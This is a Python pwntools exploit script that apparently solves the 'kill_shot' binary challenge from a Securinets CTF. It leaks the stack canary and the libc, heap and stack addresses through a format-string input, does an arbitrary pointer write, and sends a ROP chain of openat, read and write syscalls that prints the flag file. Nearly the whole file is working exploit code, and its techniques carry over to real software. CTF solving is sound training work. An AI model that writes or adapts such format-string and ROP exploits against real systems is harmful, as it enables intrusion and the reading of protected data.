from pwn import *
import sys
import os

remote_ip,port = 'bin.q21.ctfsecurinets.com','1338'
binary = './kill_shot'
brkpts = '''
b*0x555555555167
b*0x555555555236
b*0x555555554e78

'''

rop = ROP("./libc.so.6")

if len(sys.argv) > 1 :
    io = remote(remote_ip,port)

else:
    io = process(binary,env={"LD_PRELOAD":"./libc.so.6"})
    gdb.attach(io)

re = lambda a: io.recv(a)
ru = lambda a: io.recvuntil(a)
rl = lambda  : io.recvline()
s  = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla= lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)



if __name__== "__main__":

	sla("Format: ","%15$p, %6$p, code: %4$p, libc: %25$p")

	#ru("stack: ")
	canary = int(re(18),16)

	
	ru(", ")
	stack = int(re(14),16)
	ru("code: ")
	heap = int(re(14),16)
	ru("libc: ")
	libc = int(re(14),16)-0x21b97

	log.info("canary : "+ hex(canary))
	log.info("stack "+hex(stack))
	log.info("heap "+hex(heap))
	log.info("libc "+hex(libc))



	ptr = stack-0xd8-0x48

        val = heap +0x21d8

        log.info("write to : "+hex(ptr))
        log.info("heap : "+hex(val))

        sla("Pointer: ",str(ptr))
        sla("Content: ",p64(val))

        pop_rax = libc+0x0000000000043a78
        pop_rdi = libc+0x000000000002155f
        pop_rsi = libc+0x0000000000023e8a
        pop_rdx = libc+0x0000000000001b96
        pop_r10 = libc+0x0000000000130865
        ret = libc + 0x00000000000008aa
        sys = libc + 0x000e5965

        writestr = heap

        #payload = p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(writestr) + p64(pop_rdx) + p64(40) + p64(sys)

        payload = p64(pop_rax) + p64(257) + p64(pop_rdi) + p64(0xffffffffffffff9c) + p64(pop_rsi) + p64(writestr+0x22c8) + p64(pop_rdx) + p64(0) +p64(pop_r10)+p64(0)+ p64(sys)
        payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(8) + p64(pop_rsi)+ p64(writestr + 0x50) + p64(pop_rdx)+p64(0x80) + p64(sys)
        payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1) + p64(pop_rsi)+ p64(writestr + 0x50) + p64(pop_rdx)+ p64(0x90) + p64(sys)
        payload += b"/home/ctf/flag.txt\x00"

        sl("1")
        sla("Size: ",str(0x208))
        sla("Data: ",b"x"*0x200+p64(canary))

        sl("1")
        sla("Size: ",str(0x200))
        sla("Data: ",payload)

        sla("exit\n", "3")
        #sleep(1)
        #s('/home/ctf/flag.txt')
        io.interactive()

